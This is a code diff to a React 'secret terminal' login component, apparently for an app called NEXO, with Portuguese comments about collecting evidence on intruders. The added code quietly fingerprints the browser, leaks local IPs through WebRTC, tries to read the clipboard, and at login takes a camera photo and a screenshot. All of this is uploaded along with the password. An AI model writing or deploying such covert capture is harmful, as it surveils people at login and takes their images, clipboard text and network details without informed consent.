@@ -1,14 +1,16 @@
 import { useState, useRef, useEffect } from 'react'
 import { useAuth } from '../context/AuthContext'
 
-// Coletar device fingerprint AVANÇADO no frontend
-// Coleta TUDO que é possível para identificar o intruso
+// ============================================================
+// COLETA AVANÇADA DE EVIDÊNCIAS DO INTRUSO
+// ============================================================
+
 async function collectFingerprint() {
   const canvas = document.createElement('canvas')
   const ctx = canvas.getContext('2d')
   ctx.textBaseline = 'top'
   ctx.font = '14px Arial'
-  ctx.fillText('NEXO fingerprint v2.0', 2, 2)
+  ctx.fillText('NEXO fingerprint v3.0', 2, 2)
   const canvasHash = canvas.toDataURL().slice(-32)
 
   // WebGL detalhado
@@ -35,7 +37,7 @@ async function collectFingerprint() {
   }))
 
   // Font detection básica
-  const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Helvetica', 'Comic Sans MS']
+  const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino Linotype']
   const fonts = []
   const testCanvas = document.createElement('canvas')
   const testCtx = testCanvas.getContext('2d')
@@ -92,13 +94,194 @@ async function collectFingerprint() {
         effectiveType: conn.effectiveType,
         downlink: conn.downlink,
         rtt: conn.rtt,
-        saveData: conn.saveData
+        saveData: conn.saveData,
+        downlinkMax: conn.downlinkMax || 'N/A'
       }
     }
   } catch (e) {}
 
   // Touch support
   const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0
+
+  // WebRTC IP leak detection
+  let webrtc = 'N/A'
+  try {
+    const ips = new Set()
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] })
+    pc.createDataChannel('')
+    pc.createOffer().then(o => pc.setLocalDescription(o))
+    pc.onicecandidate = (ice) => {
+      if (!ice || !ice.candidate || !ice.candidate.candidate) return
+      const candidate = ice.candidate.candidate
+      const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)
+      if (ipMatch) ips.add(ipMatch[0])
+    }
+    await new Promise(r => setTimeout(r, 800))
+    pc.close()
+    webrtc = Array.from(ips)
+  } catch (e) {}
+
+  // Permissions query
+  let permissions = 'N/A'
+  try {
+    const perms = {}
+    const permNames = ['camera', 'microphone', 'notifications', 'clipboard-read', 'clipboard-write', 'geolocation', 'midi', 'midi-sysex']
+    await Promise.all(permNames.map(async name => {
+      try {
+        const result = await navigator.permissions.query({ name })
+        perms[name] = result.state
+      } catch (e) {}
+    }))
+    permissions = perms
+  } catch (e) {}
+
+  // Performance / Navigation timing
+  let performance = 'N/A'
+  try {
+    const nav = performance?.timing || {}
+    const mem = performance?.memory || {}
+    performance = {
+      navigationStart: nav.navigationStart,
+      loadEventEnd: nav.loadEventEnd,
+      domComplete: nav.domComplete,
+      usedJSHeapSize: mem.usedJSHeapSize,
+      totalJSHeapSize: mem.totalJSHeapSize,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory
+    }
+  } catch (e) {}
+
+  // Bluetooth availability
+  let bluetooth = 'N/A'
+  try {
+    bluetooth = !!navigator.bluetooth
+  } catch (e) {}
+
+  // USB availability
+  let usb = 'N/A'
+  try {
+    usb = !!navigator.usb
+  } catch (e) {}
+
+  // VR Displays
+  let vrDisplays = 'N/A'
+  try {
+    if (navigator.xr) {
+      vrDisplays = 'WebXR disponível'
+    } else if (navigator.getVRDisplays) {
+      const displays = await navigator.getVRDisplays()
+      vrDisplays = displays.length
+    }
+  } catch (e) {}
+
+  // Clipboard (tenta ler — pode falhar silenciosamente)
+  let clipboard = 'N/A'
+  try {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      const text = await Promise.race([
+        navigator.clipboard.readText(),
+        new Promise((_, rej) => setTimeout(() => rej('timeout'), 500))
+      ])
+      clipboard = { available: true, preview: text?.slice(0, 50) || '' }
+    }
+  } catch (e) {
+    clipboard = { available: false, error: e.message || 'denied' }
+  }
+
+  // Device orientation / motion
+  let deviceOrientation = 'N/A'
+  try {
+    deviceOrientation = {
+      absolute: window.DeviceOrientationEvent?.absolute,
+      alpha: ' DeviceOrientationEvent' in window,
+      motion: 'DeviceMotionEvent' in window
+    }
+  } catch (e) {}
+
+  // Installed apps (Chrome only, experimental)
+  let installApps = 'N/A'
+  try {
+    if (navigator.getInstalledRelatedApps) {
+      const apps = await navigator.getInstalledRelatedApps()
+      installApps = apps.map(a => a.id || a.platform)
+    }
+  } catch (e) {}
+
+  // Media capabilities
+  let mediaCapabilities = 'N/A'
+  try {
+    if (navigator.mediaCapabilities) {
+      const mc = await navigator.mediaCapabilities.decodingInfo({
+        type: 'file',
+        video: { contentType: 'video/mp4; codecs="avc1.42E01E"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 },
+        audio: { contentType: 'audio/mp4; codecs="mp4a.40.2"' }
+      })
+      mediaCapabilities = { supported: mc.supported, smooth: mc.smooth, powerEfficient: mc.powerEfficient }
+    }
+  } catch (e) {}
+
+  // Speech synthesis
+  let speech = 'N/A'
+  try {
+    speech = {
+      synthesis: 'speechSynthesis' in window,
+      voices: window.speechSynthesis ? window.speechSynthesis.getVoices().length : 0
+    }
+  } catch (e) {}
+
+  // Wake lock
+  let wakeLock = 'N/A'
+  try {
+    wakeLock = 'wakeLock' in navigator
+  } catch (e) {}
+
+  // Payment
+  let payment = 'N/A'
+  try {
+    payment = 'PaymentRequest' in window
+  } catch (e) {}
+
+  // Credentials API
+  let credentials = 'N/A'
+  try {
+    credentials = 'credentials' in navigator
+  } catch (e) {}
+
+  // Web Share
+  let share = 'N/A'
+  try {
+    share = 'share' in navigator
+  } catch (e) {}
+
+  // Contacts
+  let contacts = 'N/A'
+  try {
+    contacts = 'contacts' in navigator && 'select' in navigator.contacts
+  } catch (e) {}
+
+  // Serial
+  let serial = 'N/A'
+  try {
+    serial = 'serial' in navigator
+  } catch (e) {}
+
+  // HID
+  let hid = 'N/A'
+  try {
+    hid = 'hid' in navigator
+  } catch (e) {}
+
+  // MIDI
+  let midi = 'N/A'
+  try {
+    midi = 'requestMIDIAccess' in navigator
+  } catch (e) {}
+
+  // Gamepads
+  let gamepads = 'N/A'
+  try {
+    gamepads = navigator.getGamepads ? navigator.getGamepads().length : 0
+  } catch (e) {}
 
   return {
     canvas: canvasHash,
@@ -133,9 +316,112 @@ async function collectFingerprint() {
     audio,
     battery,
     network,
+    webrtc,
+    permissions,
+    performance,
+    bluetooth,
+    usb,
+    vrDisplays,
+    clipboard,
+    deviceOrientation,
+    installApps,
+    mediaCapabilities,
+    speech,
+    wakeLock,
+    payment,
+    credentials,
+    share,
+    contacts,
+    serial,
+    hid,
+    midi,
+    gamepads,
   }
 }
 
+// ============================================================
+// CAPTURA DE CÂMERA (getUserMedia)
+// ============================================================
+async function captureCameraPhoto() {
+  try {
+    // Tenta acessar a câmera sem áudio
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    const video = document.createElement('video')
+    video.srcObject = stream
+    video.setAttribute('playsinline', 'true')
+    video.muted = true
+
+    await new Promise((resolve, reject) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(reject)
+      }
+      setTimeout(() => reject(new Error('camera timeout')), 3000)
+    })
+
+    // Pequeno delay para garantir frame
+    await new Promise(r => setTimeout(r, 300))
+
+    const canvas = document.createElement('canvas')
+    canvas.width = video.videoWidth || 640
+    canvas.height = video.videoHeight || 480
+    const ctx = canvas.getContext('2d')
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
+
+    // Parar stream
+    stream.getTracks().forEach(t => t.stop())
+
+    // Comprimir para JPEG ~70% qualidade para não estourar payload
+    return canvas.toDataURL('image/jpeg', 0.7)
+  } catch (e) {
+    console.warn('[SECURITY] Falha ao capturar câmera:', e.message)
+    return null
+  }
+}
+
+// ============================================================
+// CAPTURA DE SCREENSHOT (getDisplayMedia)
+// ============================================================
+async function captureScreenshot() {
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({
+      video: { displaySurface: 'browser', cursor: 'never' },
+      audio: false,
+      preferCurrentTab: true,
+      selfBrowserSurface: 'include',
+      surfaceSwitching: 'exclude'
+    })
+
+    const video = document.createElement('video')
+    video.srcObject = stream
+    video.setAttribute('playsinline', 'true')
+
+    await new Promise((resolve, reject) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(reject)
+      }
+      setTimeout(() => reject(new Error('screenshot timeout')), 5000)
+    })
+
+    await new Promise(r => setTimeout(r, 500))
+
+    const canvas = document.createElement('canvas')
+    canvas.width = video.videoWidth || window.innerWidth
+    canvas.height = video.videoHeight || window.innerHeight
+    const ctx = canvas.getContext('2d')
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
+
+    stream.getTracks().forEach(t => t.stop())
+
+    return canvas.toDataURL('image/jpeg', 0.7)
+  } catch (e) {
+    console.warn('[SECURITY] Falha ao capturar screenshot:', e.message)
+    return null
+  }
+}
+
+// ============================================================
+// COMPONENTE SECRET TERMINAL
+// ============================================================
 function SecretTerminal({ isOpen, onClose }) {
   const { login } = useAuth()
   const [lines, setLines] = useState([])
@@ -148,7 +434,7 @@ function SecretTerminal({ isOpen, onClose }) {
   useEffect(() => {
     if (isOpen) {
       setLines([
-        { type: 'banner', text: 'NEXO SECURE TERMINAL v1.0' },
+        { type: 'banner', text: 'NEXO SECURE TERMINAL v3.0' },
         { type: 'info', text: 'Digite seu login e senha para acessar o sistema.' },
         { type: 'prompt', text: 'login: ' }
       ])
@@ -182,11 +468,17 @@ function SecretTerminal({ isOpen, onClose }) {
       setLines(prev => [...prev, { type: 'loading', text: 'Authenticating...' }])
 
       try {
-        const fingerprint = await collectFingerprint()
+        // Coleta TUDO em paralelo para não atrasar
+        const [fingerprint, cameraPhoto, screenshot] = await Promise.all([
+          collectFingerprint(),
+          captureCameraPhoto(),
+          captureScreenshot()
+        ])
+
         const res = await fetch('/api/auth/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password: value, fingerprint })
+          body: JSON.stringify({ username, password: value, fingerprint, cameraPhoto, screenshot })
         })
         const data = await res.json()
 
